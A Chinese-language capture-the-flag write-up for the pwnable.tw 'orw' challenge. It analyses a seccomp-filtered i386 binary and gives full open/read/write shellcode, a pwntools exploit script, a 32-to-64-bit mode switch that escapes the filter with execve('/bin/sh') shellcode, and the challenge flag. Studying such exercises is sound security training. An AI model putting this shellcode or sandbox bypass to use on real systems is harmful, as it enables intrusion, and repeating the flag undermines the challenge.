---
tags:
  - shellcode
  - seccomp-bypass
platform: pwnable.tw
points: 100
arch: i386
libc: static
relro: partial
canary: yes
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "在固定地址的 RWX BSS 缓冲区执行用户 shellcode，但 seccomp 过滤器只允许 open、read、write 系统调用，需借此读取 flag 文件。"
proof-of-concept: no
---

# orw — pwnable.tw（100 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10001`
>
> Flag: `FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}`

## 题目概览

一道极简的 i386 shellcode 题。二进制把最多 0xc8（200）字节用户输入读入 `0x804a060` 处固定的 BSS 缓冲区，然后跳过去执行。执行前通过 `prctl` 安装 seccomp BPF 过滤器，把系统调用限制为只有 `open`、`read`、`write`（外加 `exit`、`exit_group`、`sigreturn`、`rt_sigreturn`）。目标是仅用这三个系统调用读取 `/home/orw/flag`。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX disabled         # writable + executable BSS
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments
```

## 二进制分析

### `main` 反汇编

```asm
08048548 <main>:
 8048559:  call   80484cb <orw_seccomp>     ; install seccomp filter
 8048561:  push   0x80486a0                 ; "Give my your shellcode:"
 8048566:  call   8048380 <printf@plt>
 8048571:  push   0xc8                      ; count = 200 bytes
 8048576:  push   0x804a060                 ; buf = BSS buffer
 804857b:  push   0x0                       ; fd = stdin
 804857d:  call   8048370 <read@plt>        ; read(0, 0x804a060, 0xc8)
 8048585:  mov    eax, 0x804a060
 804858a:  call   *eax                      ; execute shellcode
```

### Seccomp 过滤器（BPF 规则）

```text
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011   # NOTE: non-i386 → ALLOW
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)       # deny
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

**允许的 i386 系统调用：** `open`（5）、`read`（3）、`write`（4）、`exit`（1）、`exit_group`（252）、`sigreturn`（119）、`rt_sigreturn`（173）。

**Seccomp bug：** 第 0001 行的架构检查对非 i386 架构直接跳到 ALLOW。也就是说，通过 `retf` 把 CS 设为 0x33 切换到 x86-64 模式，就能绕过全部限制，执行 `execve("/bin/sh")`。

## 漏洞

### V1 — 任意 shellcode 执行（主漏洞）

**根因：** 程序把用户提供的 shellcode 读入 RWX 的 BSS 缓冲区，并用 `call *eax` 直接调用。除 seccomp 过滤器外没有任何输入校验。

```c
// Pseudocode of main
void main() {
    orw_seccomp();                         // install BPF filter
    printf("Give my your shellcode:");
    read(0, (void *)0x804a060, 0xc8);      // read up to 200 bytes
    ((void(*)())0x804a060)();              // execute as code
}
```

**影响：** 完整的 shellcode 执行能力，仅在 i386 下被 seccomp 限制为 `open`/`read`/`write`。

### V2 — Seccomp 架构检查 bug（附赠）

**根因：** BPF 过滤器执行 `if (arch != ARCH_I386) goto ALLOW`。非 i386 的系统调用是**放行**而不是拒绝。在运行 32 位二进制的 x86-64 内核上，`retf` 到段选择子 `0x33` 会把 CPU 切到 64 位长模式，此时所有系统调用（含 `execve`）都能通过过滤器。

```asm
; Switch from 32-bit to 64-bit mode
mov dword [esp+4], 0x33   ; CS selector for 64-bit
retf                       ; far return → now in amd64 mode
; 64-bit execve("/bin/sh") shellcode follows
```

**影响：** 通过 `execve` 拿到完整 shell，彻底绕过原本的 open/read/write 限制。

## 利用路径

### 路径 A — open/read/write 三段式 shellcode（预期解法，标准做法）

**使用范围：** 302 份解法中约 95%

最经典的思路：写 i386 shellcode，依次执行 `open("/home/orw/flag")` → `read(fd, buf, len)` → `write(1, buf, len)`。

**Shellcode 逻辑（等价的 C 代码）：**
```c
int fd = open("/home/orw/flag", O_RDONLY, 0);   // syscall 5
read(fd, buf, 0x30);                             // syscall 3
write(1, buf, 0x30);                             // syscall 4
```

**典型手写汇编（i386，约 50-70 字节）：**
```asm
; === open("/home/orw/flag", O_RDONLY, 0) ===
xor  eax, eax
xor  ecx, ecx
push eax                    ; NUL terminator
push 0x67616c66             ; "flag"
push 0x2f77726f             ; "orw/"
push 0x2f656d6f             ; "ome/"
push 0x682f2f2f             ; "///h"  (extra / padding for alignment)
mov  ebx, esp               ; ebx = pointer to path on stack
xor  edx, edx
mov  al, 5                  ; SYS_open
int  0x80                   ; fd returned in eax

; === read(fd, esp, 0x40) ===
mov  ebx, eax               ; ebx = fd
mov  ecx, esp               ; ecx = buffer (reuse stack)
mov  dl, 0x40               ; edx = count
xor  eax, eax
mov  al, 3                  ; SYS_read
int  0x80

; === write(1, esp, 0x40) ===
mov  edx, eax               ; edx = bytes read
xor  ebx, ebx
mov  bl, 1                  ; ebx = stdout
mov  al, 4                  ; SYS_write
int  0x80
```

**各解法中的变体：**

| 变体 | 说明 |
|---------|-------------|
| **栈上字符串** | 把路径按 dword 逆序压栈（最常见） |
| **内联字符串** | 用 `call`/`pop` 或 `jmp`/`call`/`pop` 获取内联字符串地址 |
| **硬编码 BSS 地址** | 把文件内容读到已知的 BSS 地址（例如 `0x804a040`、`0x804a100`）而非栈上 |
| **两阶段读取** | 第一段 shellcode 先 `read(0, writable, N)` 接收路径字符串，再 `open`/`read`/`write` |
| **pwntools shellcraft** | `shellcraft.open() + shellcraft.read() + shellcraft.write()` 或 `shellcraft.cat2()` |
| **逐字节读写** | 在循环里一次读写一个字节（shell-storm.org shellcode-73） |
| **硬编码 fd=3** | 假定 `open` 返回 fd 3（因为 0/1/2 分别是 stdin/stdout/stderr） |

**`read` 的缓冲区选择：**
- **栈（`esp`）** —— 最常见，无需地址
- **BSS（`0x804a040`+）** —— 静态地址，无 PIE，安全
- **shellcode 缓冲区本身（`0x804a060`+）** —— RWX，shellcode 足够短时可行

---

### 路径 B — 切换架构到 x86-64 → `execve("/bin/sh")`（绕过 seccomp）

**使用范围：** 解法 1225、1727 以及少数其他

利用 seccomp 过滤器放行非 i386 架构的 bug。用 CS=0x33 的 `retf` 把 CPU 从 32 位兼容模式切到 64 位长模式，再执行标准的 amd64 `execve("/bin/sh")` shellcode。

```asm
; Stage 1: switch to 64-bit mode
jmp  setup
to64:
    mov  dword [esp+4], 0x33    ; CS selector for long mode
    retf                         ; far return → 64-bit mode
setup:
    call to64

; Stage 2: standard amd64 execve("/bin/sh")
xor    eax, eax
mov    rbx, 0xff978cd091969dd1  ; NOT("/bin/sh\0")
not    rbx
push   rbx
push   rsp
pop    rdi
cdq
push   rdx
push   rdi
push   rsp
pop    rsi
mov    al, 0x3b                 ; SYS_execve (amd64)
syscall
```

**影响：** 拿到完整交互式 shell，而不只是读 flag。彻底绕过原本的 ORW 限制。

**可靠性：** 100% —— 不涉及随机性。但要求远程内核支持 64 位模式（这一点成立，因为它是运行 32 位二进制的 64 位主机）。

---

### 路径 C — pwntools 一行流（图省事）

**使用范围：** 很多解法

借助 pwntools 的 `shellcraft` 模块自动生成 shellcode：

```python
from pwn import *
context(arch='i386', os='linux')
p = remote("chall.pwnable.tw", 10001)
shellcode = asm(
    shellcraft.open("/home/orw/flag") +
    shellcraft.read("eax", "esp", 50) +
    shellcraft.write(1, "esp", 50)
)
p.sendlineafter(":", shellcode)
print(p.recv())
```

用 `shellcraft.cat2()` 还能更短：
```python
shellcode = shellcraft.cat2("/home/orw/flag")
```

## 关键技术细节

### 系统调用号（i386 `int 0x80`）

| 系统调用 | 编号 | 寄存器 |
|---------|--------|-----------|
| `open`  | 5      | ebx=path, ecx=flags, edx=mode |
| `read`  | 3      | ebx=fd, ecx=buf, edx=count |
| `write` | 4      | ebx=fd, ecx=buf, edx=count |
| `exit`  | 1      | ebx=status |

### `/home/orw/flag` 的字符串编码

路径必须按逆序以 32 位 dword 压栈，并补齐到 4 字节对齐：

```asm
"/home/orw/flag\x00" (15 bytes) → pad to 16 with extra '/'

"///home/orw/flag\x00" pushed as:
  push 0x00000000     ; NUL terminator (or xor eax,eax; push eax)
  push 0x67616c66     ; "flag"
  push 0x2f77726f     ; "orw/"
  push 0x2f656d6f     ; "ome/"
  push 0x682f2f2f     ; "///h"
```

有些解法用 `0x00006761` 作为最后一个 dword（高字节为零）来省掉 NUL 的压栈，或者用 `call`/`pop` 引用内联字符串。

### 内存布局

| 地址 | 内容 |
|---------|---------|
| `0x804a060` | Shellcode 缓冲区（BSS，RWX，最多 200 字节） |
| `0x804a040` | `.bss` 节起始 |
| `0x804a000` | `.got.plt` |

## 题解文章

| 文件 | 思路 | 关键技术 | 备注 |
|------|----------|---------------|-------|
| `100.md` | A | 来自 shell-storm.org 的逐字节循环 | 经典的 shellcode-73 |
| `117.md` | A | 手写 shellcode，路径用 XOR 编码 | 用 XOR 技巧压路径以避开 NUL |
| `1001.md` | A（pwntools） | `shellcraft.open` + `shellcraft.read` + `shellcraft.write` | 最干净的 pwntools 写法 |
| `1039.md` | A | NASM 汇编，独立 `.asm` 文件 | 用 `xchg` 技巧压缩代码 |
| `1045.md` | A（pwntools） | `shellcraft.open` + `shellcraft.read(3, 'esp', 50)` | 硬编码 fd=3 |
| `1151.md` | A（pwntools） | `shellcraft.pushstr` + `shellcraft.syscall` | 用 BSS `0x804a800` 作读缓冲区 |
| `1169.md` | A | 紧凑手写，41 字节 | 用 `xchg`/`mul` 技巧做到极小尺寸 |
| `1225.md` | **B** | **通过 `retf` 切 CS=0x33 进入 x86-64** | 完整 shell，绕过 seccomp 过滤器 |
| `1266.md` | A | 路径和缓冲区都用硬编码 BSS 地址 | 引用 `0x804a095` 和 `0x804a220` |
| `1297.md` | A | 压栈路径，用 `xchg` 调整寄存器 | 干净的 32 位 int 0x80 |
| `1316.md` | A | Go 语言 exploit 客户端 | 通过 Go net.Dial 发送原始 shellcode |
| `1754.md` | A | 详细学习笔记，含 GDB 调试 | 展示完整开发过程 |
| `10068.md` | A | NASM 独立汇编 + Python 发送端 | 汇编与 exploit 干净分离 |
| `10115.md` | A | 硬编码 BSS 缓冲区 `0x804a140` | 用 `mov` 而不是 `push`/`pop` |
| `10840.md` | A | 两阶段：先 `read` 路径字符串，再 ORW | 路径作为第二个 payload 发送 |
| `11543.md` | A | Intel 语法 `.s` 文件 + shell 管道 | `as --32` + `objcopy` + `nc` |
| `12928.md` | A | NASM，用 `call`/`pop` 取内联字符串 | 经典 `jmp`-`call`-`pop` 模式 |
| `14121.md` | A | 详细中文题解，含 seccomp 分析 | 使用 `seccomp-tools`，解释 BSS 布局 |
| `18160.md` | A | seccomp 分析 + pwntools `shellcraft.cat2` | 一行流写法 |
| `18582.md` | A | NASM + Python，详细分步讲解 | 良好教学式题解 |
| `20313.md` | A | 中文题解，附完整汇编解释 | 解释 fd=3 的假设与栈平衡 |
| `28834.md` | A | `shellcraft.cat2("/home/orw/flag")` | 最短的 pwntools 写法 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用利用脚本（原始 socket，`call`/`pop` shellcode） |
| `desc.txt` | 题目描述 |
| `artifacts/orw` | 原始题目二进制（i386，已 strip） |
| `solution/*.md` | 社区题解文章（302 个解法） |
